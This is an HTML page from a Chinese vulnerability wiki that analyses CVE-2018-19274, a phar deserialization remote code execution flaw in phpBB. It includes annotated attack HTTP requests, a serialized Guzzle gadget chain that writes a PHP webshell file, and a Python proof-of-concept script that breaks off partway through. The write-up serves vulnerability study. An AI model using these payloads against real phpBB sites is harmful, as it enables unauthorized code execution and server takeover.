<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/PhpBB/%EF%BC%88CVE-2018-19274%EF%BC%89PhpBB%20Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2018-19274）PhpBB Phar反序列化远程代码漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2018-19274\uff09PhpBB Phar\u53cd\u5e8f\u5217\u5316\u8fdc\u7a0b\u4ee3\u7801\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_8" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2019-13376%EF%BC%89PhpBB%E4%BB%8Esession%20id%E6%B3%84%E9%9C%B2%E5%88%B0CSRF%E5%88%B0XSS/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2019-13376%EF%BC%89PhpBB%E4%BB%8Esession%20id%E6%B3%84%E9%9C%B2%E5%88%B0CSRF%E5%88%B0XSS/" class="btn btn-xs btn-link">
        （CVE-2019-13376）PhpBB从session id泄露到CSRF到XSS
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Php/xdebug-rce/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Php/xdebug-rce/README.zh-cn/" class="btn btn-xs btn-link">
        PHP XDebug远程调试导致代码执行漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2018-19274phpbb-phar">（CVE-2018-19274）PhpBB Phar反序列化远程代码漏洞<a class="headerlink" href="#cve-2018-19274phpbb-phar" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>攻击者若通过社工，弱口令，钓鱼等方式拥有控制管理面板权限，可先前台上传恶意附件，再进入后台控制管理面板利用设置中对路径的验证的功能，结合PHP
phar 反序列化进行php对象注入，构造可用的恶意攻击链，获取Webshell。</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>phpBB v3.2.3及以前的版本</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<p>先看触发php phar反序列化漏洞的核心代码如下：</p>
<p>文件位置：<code>phpBB3/includes/functions_acp.php::validate_config_vars</code></p>
<p><img alt="1.png" src="../resource/%28CVE-2018-19274%29PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId25.png" /></p>
<p>通过<code>file_exists</code>函数判断<code>$path</code>是否存在，此处若可以被我们上传PHAR归档包，文件路径若被我们可知可控，就可以通过<code>phar://</code>协议进行反序列化攻击。</p>
<h3 id="_5">触发点分析<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<p>首先是载入的时候调用<code>acp_attachments-&gt;main()</code>方法</p>
<p>文件位置：<code>phpBB3/includes/acp/acp_attachments.php</code></p>
<p><img alt="2.png" src="../resource/%28CVE-2018-19274%29PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId27.png" /></p>
<p>关键函数为<code>validate_config_vars</code>函数，第一个参数为<code>$display_vars['vars']</code>来自上文的系统配置定义：</p>
<p><img alt="3.png" src="../resource/%28CVE-2018-19274%29PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId28.png" /></p>
<p>第二个参数通过<code>$_REQUEST</code>接收，post发送数组参数<code>config</code>，被赋值成为<code>$cfg_array</code></p>
<p>两个参数传入<code>validate_config_vars</code>函数，继续跟进。</p>
<p>文件位置：<code>phpBB3/includes/functions_acp.php</code></p>
<p><img alt="4.png" src="../resource/%28CVE-2018-19274%29PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId29.png" /></p>
<p>进入函数后使用<code>foreach</code>对<code>$config_vars</code>进行遍历，键名为<code>$config_name</code>，键值为<code>$config_definition</code>。</p>
<p>先对<code>$cfg_array</code>进行判断，也就是post数组中必须有和系统配置数组相同的键名的数组；然后又对键值的判断是否存在<code>$config_definition['validate']</code>。两个条件需要同时满足，不满足就跳过此变量循环，存在就对<code>$config_definition['validate']</code>进行分割为数组，并取第0个参数传进<code>switch</code>进行匹配，可以发现利用点在<code>wpath</code>分支里：</p>
<p><img alt="5.png" src="../resource/%28CVE-2018-19274%29PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId30.png" /></p>
<p>满足上文两条件并且<code>$validator[$type]==wpath</code>才能进入分支，对系统配置数组进行筛选，暂时发现只有键名为<code>upload_path</code>的数组满足条件。</p>
<p>但是在进入路径判断前有一个三元运算</p>
<div class="codehilite"><pre><span></span><code>$path = in_array($config_definition[&#39;validate&#39;], array(&#39;wpath&#39;, &#39;path&#39;, &#39;rpath&#39;, &#39;rwpath&#39;)) ? $phpbb_root_path . $cfg_array[$config_name] : $cfg_array[$config_name];
</code></pre></div>

<p>经过判断<code>$config_definition['validate']</code>在数组之中，所以会走第一个分支，<code>$cfg_array[$config_name]</code>就是post数组变量，此处可控，但是会和<code>$phpbb_root_path</code>进行拼接。文件位置：<code>phpBB3/adm/index.php</code></p>
<p><img alt="6.png" src="../resource/%28CVE-2018-19274%29PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId31.png" /></p>
<p>因此拼接后的<code>$path</code>会变成<code>./../xxxxxxxxxx</code>，路径出错无法利用，如下。</p>
<p><img alt="7.png" src="../resource/%28CVE-2018-19274%29PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId32.png" /></p>
<p>但是这里的整个<code>switch</code>语句犯了一个较为低级的错误，部分条件的语句段没有使用<code>break</code>进行结束。</p>
<p><code>switch</code>执行方式：开始时没有代码被执行。仅当一个 <code>case</code>语句中的值和
<code>switch</code>表达式的值匹配时 PHP
才开始执行语句，直到<code>switch</code>的程序段结束或者遇到第一个<code>break</code>
语句为止。如果不在<code>case</code>的语句段最后写上<code>break</code>的话，PHP
将继续执行下一个<code>case</code>中的语句段。</p>
<p><img alt="8.png" src="../resource/%28CVE-2018-19274%29PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId33.png" /></p>
<p>因此需要在<code>$config_vars</code>找到一个元素<code>$config_definition</code>，并且<code>$config_definition['validate']</code>等于<code>absolute_path</code>或者<code>absolute_path_writable</code>或者<code>path</code>，这样就能即进入<code>wpath</code>执行也不增加<code>$path</code>的前缀</p>
<p>使用如下代码过滤：</p>
<div class="codehilite"><pre><span></span><code><span class="n">foreach</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">display_vars</span><span class="p">[</span><span class="s1">&#39;vars&#39;</span><span class="p">]</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">$</span><span class="n">key</span><span class="w"> </span><span class="o">=&gt;$</span><span class="n">value</span><span class="p">){</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="o">$</span><span class="n">value</span><span class="p">[</span><span class="s1">&#39;validate&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;absolute_path&#39;</span><span class="p">)</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">value</span><span class="p">[</span><span class="s1">&#39;validate&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;absolute_path_writable&#39;</span><span class="p">)</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">value</span><span class="p">[</span><span class="s1">&#39;validate&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;path&#39;</span><span class="p">)){</span>
<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;66&#39;</span><span class="o">.$</span><span class="n">key</span><span class="o">.</span><span class="s1">&#39;77&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>发现<code>img_imagick</code>元素满足条件：</p>
<p><img alt="9.png" src="../resource/%28CVE-2018-19274%29PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId34.png" /></p>
<p>进入控制面板的附件设定，提交并该修改数据包</p>
<p><img alt="10.png" src="../resource/%28CVE-2018-19274%29PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId35.png" /></p>
<p>数据包如下，关键点为<code>config[img_imagick]</code>参数：</p>
<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/phpBB3/adm/index.php?i=acp_attachments&amp;mode=attach&amp;sid=385d5172c29a3a9530d6b467a5691ffd</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">www.0-sec.org</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">python-requests/2.21.0</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">967</span>

config%5Ballow_attachments%5D=1&amp;config%5Ballow_pm_attach%5D=0&amp;config%5Bupload_path%5D=files&amp;config%5Bdisplay_order%5D=0&amp;config%5Battachment_quota%5D=50&amp;attachment_quota=mb&amp;config%5Bmax_filesize%5D=256&amp;max_filesize=kb&amp;config%5Bmax_filesize_pm%5D=256&amp;max_filesize_pm=kb&amp;config%5Bmax_attachments%5D=3&amp;config%5Bmax_attachments_pm%5D=1&amp;config%5Bsecure_downloads%5D=0&amp;config%5Bsecure_allow_deny%5D=1&amp;config%5Bsecure_allow_empty_referer%5D=1&amp;config%5Bcheck_attachment_content%5D=1&amp;config%5Bimg_display_inlined%5D=1&amp;config%5Bimg_create_thumbnail%5D=0&amp;config%5Bimg_max_thumb_width%5D=400&amp;config%5Bimg_min_thumb_filesize%5D=12000&amp;config%5Bimg_imagick%5D=phar://../files/plupload/c2f830acec21b6d3a45ff0f5b3f35273_5de5caf862ea58bbb27aff231f06c7f3zip.part/&amp;config%5Bimg_max_width%5D=0&amp;config%5Bimg_max_height%5D=0&amp;config%5Bimg_link_width%5D=0&amp;config%5Bimg_link_height%5D=0&amp;submit=Submit&amp;ips=&amp;ipexclude=0&amp;creation_time=1552465991&amp;form_token=0910a5dc9a13fc50a0ead4656617642fa80daaf1
</code></pre></div>

<p>此时已经可以触发反序列化，还需上传包含利用链的恶意附件。</p>
<h3 id="_6">上传恶意附件<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
<p>上传位置为前台发帖附件处:</p>
<p><img alt="11.png" src="../resource/%28CVE-2018-19274%29PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId37.png" /></p>
<p>处理文件上传的关键函数，以及函数调用栈：</p>
<p>文件位置：<code>phpBB3/phpbb/plupload/plupload.php</code></p>
<p><img alt="12.png" src="../resource/%28CVE-2018-19274%29PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId38.png" /></p>
<p>在这里函数handle_upload可以实现多个<code>chunk</code>处理。<code>$this-&gt;request-&gt;variable</code>函数根据键名从请求中获取值，首先获取<code>chunks</code>的值，并判断<code>chunk</code>是否小于2，如果小于就直接返回，如果大于就开始进行多<code>chunk</code>处理。</p>
<p>然后进入关键的<code>temporary_filepath</code>函数：</p>
<p><img alt="13.png" src="../resource/%28CVE-2018-19274%29PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId39.png" /></p>
<p>这个就是计算上传文件路径的函数，<code>$this-&gt;temporary_directory</code>可知为<code>./files/plupload</code>，<code>$file_name</code>可控，<code>\phpbb\files\filespec::get_extension($file_name)</code>获取文件的后缀同样可控，比较麻烦的是<code>$this-&gt;config['plupload_salt']</code>存在于数据库中，但可以在管理面板中通过备份进行获取。</p>
<p><img alt="14.png" src="../resource/%28CVE-2018-19274%29PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId40.png" /></p>
<p><code>plupload_salt</code>如下</p>
<p><img alt="15.png" src="../resource/%28CVE-2018-19274%29PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId41.png" /></p>
<p>此时已经完全可以计算路径</p>
<div class="codehilite"><pre><span></span><code><span class="o">./</span><span class="n">files</span><span class="o">/</span><span class="n">plupload</span><span class="o">/</span><span class="n">c2f830acec21b6d3a45ff0f5b3f35273_5de5caf862ea58bbb27aff231f06c7f3zip</span>
</code></pre></div>

<p>然后进入函数进行文件写入</p>
<p><img alt="16.png" src="../resource/%28CVE-2018-19274%29PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId42.png" /></p>
<p>中途会产生一个临时文件，但后面会删除，最后文件名还会增加<code>.part</code>后缀。</p>
<div class="codehilite"><pre><span></span><code><span class="o">./</span><span class="n">files</span><span class="o">/</span><span class="n">plupload</span><span class="o">/</span><span class="n">c2f830acec21b6d3a45ff0f5b3f35273_5de5caf862ea58bbb27aff231f06c7f3zip</span><span class="o">.</span><span class="n">part</span>
</code></pre></div>

<p>攻击数据包如下：</p>
<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/phpBB3/posting.php?mode=post&amp;f=2&amp;sid=a3f8b226bd4ad508d8838284c0cfc332</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">www.0-sec.org</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">1909</span>
<span class="na">Origin</span><span class="o">:</span> <span class="l">http://bugtest.com</span>
<span class="na">x-requested-with</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
<span class="na">x-phpbb-using-plupload</span><span class="o">:</span> <span class="l">1</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=----WebKitFormBoundaryuHMhmTMPyBMwbiEg</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">Referer</span><span class="o">:</span> <span class="l">http://bugtest.com/phpBB3/posting.php?mode=post&amp;f=2&amp;sid=52c63bf06fdeaef60de9b8fba1de97ad</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>

------WebKitFormBoundaryuHMhmTMPyBMwbiEg
Content-Disposition: form-data; name=&quot;name&quot;

rai4over.zip
------WebKitFormBoundaryuHMhmTMPyBMwbiEg
Content-Disposition: form-data; name=&quot;chunk&quot;

0
------WebKitFormBoundaryuHMhmTMPyBMwbiEg
Content-Disposition: form-data; name=&quot;chunks&quot;

3
------WebKitFormBoundaryuHMhmTMPyBMwbiEg
Content-Disposition: form-data; name=&quot;add_file&quot;

Add the file
------WebKitFormBoundaryuHMhmTMPyBMwbiEg
Content-Disposition: form-data; name=&quot;real_filename&quot;

payload.phar.zip
------WebKitFormBoundaryuHMhmTMPyBMwbiEg
Content-Disposition: form-data; name=&quot;attachment_data[0][attach_id]&quot;

16
------WebKitFormBoundaryuHMhmTMPyBMwbiEg
Content-Disposition: form-data; name=&quot;attachment_data[0][is_orphan]&quot;

1
------WebKitFormBoundaryuHMhmTMPyBMwbiEg
Content-Disposition: form-data; name=&quot;attachment_data[0][real_filename]&quot;

payload.zip
------WebKitFormBoundaryuHMhmTMPyBMwbiEg
Content-Disposition: form-data; name=&quot;attachment_data[0][attach_comment]&quot;


------WebKitFormBoundaryuHMhmTMPyBMwbiEg
Content-Disposition: form-data; name=&quot;attachment_data[0][filesize]&quot;

35802
------WebKitFormBoundaryuHMhmTMPyBMwbiEg
Content-Disposition: form-data; name=&quot;fileupload&quot;; filename=&quot;payload.phar.zip&quot;
Content-Type: application/zip

&lt;?php __HALT_COMPILER(); ?&gt;
ÕO:31:&quot;GuzzleHttp\Cookie\FileCookieJar&quot;:4:{s:41:&quot;GuzzleHttp\Cookie\FileCookieJarfilename&quot;;s:42:&quot;/Applications/MAMP/htdocs/phpBB3/shell.php&quot;;s:52:&quot;GuzzleHttp\Cookie\FileCookieJarstoreSessionCookies&quot;;b:1;s:36:&quot;GuzzleHttp\Cookie\CookieJarcookies&quot;;a:1:{i:0;O:27:&quot;GuzzleHttp\Cookie\SetCookie&quot;:1:{s:33:&quot;GuzzleHttp\Cookie\SetCookiedata&quot;;a:3:{s:7:&quot;Expires&quot;;i:1;s:7:&quot;Discard&quot;;b:0;s:5:&quot;Value&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;}}}s:39:&quot;GuzzleHttp\Cookie\CookieJarstrictMode&quot;;N;}test.txtöì\~Ø¶test¨~ê÷z]©äg­4GBMB
------WebKitFormBoundaryuHMhmTMPyBMwbiEg--
</code></pre></div>

<p>至此我们已经对上传文件路径内容可知可控，还恶意文件中的利用链。</p>
<h3 id="_7">利用链<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
<p>利用PHP网络请求插件Guzzle完成反序列化利用。</p>
<p>文件位置：<code>phpBB3/vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php</code></p>
<p><img alt="17.png" src="../resource/%28CVE-2018-19274%29PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId44.png" /></p>
<p>析构函数调用<code>save</code>函数，最后使用<code>file_put_contents</code>完成文件写入，整个漏洞利用完成。</p>
<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code><span class="c1"># coding =utf-8</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">bs4</span><span class="w"> </span><span class="kn">import</span> <span class="n">BeautifulSoup</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>

<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s2">&quot;http&quot;</span><span class="p">:</span> <span class="s2">&quot;http://127.0.0.1:8080&quot;</span><span class="p">,</span>
<span class="p">}</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>


<span class="k">def</span><span class="w"> </span><span class="nf">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">):</span>
    <span class="n">m</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">()</span>
    <span class="n">m</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="nb">str</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf8&quot;</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">m</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">target</span> <span class="o">=</span> <span class="s2">&quot;http://bugtest.com/phpBB3&quot;</span>
    <span class="n">admin_account</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span>
    <span class="n">admin_pwd</span> <span class="o">=</span> <span class="s1">&#39;123456&#39;</span>
    <span class="n">phar_payload</span> <span class="o">=</span> <span class="s1">&#39;payload.phar.zip&#39;</span>
    <span class="n">upfilename</span> <span class="o">=</span> <span class="s1">&#39;rai4over.zip&#39;</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">admin_account</span><span class="p">,</span>
        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">admin_pwd</span><span class="p">,</span>
        <span class="s1">&#39;login&#39;</span><span class="p">:</span> <span class="s1">&#39;Login&#39;</span>
    <span class="p">}</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Start logging in to the administrator account&#39;</span><span class="p">)</span>
    <span class="n">rs</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s1">&#39;/ucp.php?mode=login&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="n">html</span> <span class="o">=</span> <span class="n">rs</span><span class="o">.</span><span class="n">text</span>

    <span class="k">if</span> <span class="p">(</span><span class="s1">&#39;header-profile dropdown-container&#39;</span> <span class="ow">in</span> <span class="n">html</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="s2">&quot;class=</span><span class="se">\&quot;</span><span class="s2">username-coloured</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span> <span class="o">+</span> <span class="n">admin_account</span> <span class="ow">in</span> <span class="n">html</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;OK! The administrator account is successfully logged in&#39;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">exit</span><span class="p">(</span><span class="s1">&#39;No! Login failed . Probably because of the verification code&#39;</span><span class="p">)</span>

    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">html</span><span class="p">,</span> <span class="s2">&quot;html.parser&quot;</span><span class="p">)</span>
    <span class="nb">input</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">,</span> <span class="n">attrs</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;sid&#39;</span><span class="p">})</span>
    <span class="n">sid</span> <span class="o">=</span> <span class="nb">input</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">]</span>

    <span class="n">file</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;fileupload&#39;</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="n">phar_payload</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

    <span class="p">}</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="n">upfilename</span><span class="p">,</span>
        <span class="s1">&#39;chunk&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
        <span class="s1">&#39;chunks&#39;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
        <span class="s1">&#39;add_file&#39;</span><span class="p">:</span> <span class="s1">&#39;Add the file&#39;</span><span class="p">,</span>
        <span class="s1">&#39;real_filename&#39;</span><span class="p">:</span> <span class="s1">&#39;payload.phar.zip&#39;</span>
    <span class="p">}</span>
    <span class="n">rs</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s1">&#39;/posting.php?mode=post&amp;f=2&amp;sid=&#39;</span> <span class="o">+</span> <span class="n">sid</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">file</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="k">if</span> <span class="s1">&#39;jsonrpc&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">rs</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
        <span class="n">exit</span><span class="p">(</span><span class="s1">&#39;Upload fail&#39;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Uploading malicious file successfully&#39;</span><span class="p">)</span>

    <span class="n">Admin_Control</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="s1">&#39;/adm/index.php?sid=&#39;</span> <span class="o">+</span> <span class="n">sid</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Get Administration Control Panel URL ：&quot;</span> <span class="o">+</span> <span class="n">Admin_Control</span><span class="p">)</span>

    <span class="n">rs</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">Admin_Control</span><span class="p">)</span>
    <span class="n">html</span> <span class="o">=</span> <span class="n">rs</span><span class="o">.</span><span class="n">text</span>
    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">html</span><span class="p">,</span> <span class="s2">&quot;html.parser&quot;</span><span class="p">)</span>
    <span class="nb">input</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">,</span> <span class="n">attrs</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;type&#39;</span><span class="p">:</span> <span class="s1">&#39;password&#39;</span><span class="p">})</span>
    <span class="n">passwd_id</span> <span class="o">=</span> <span class="nb">input</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span>
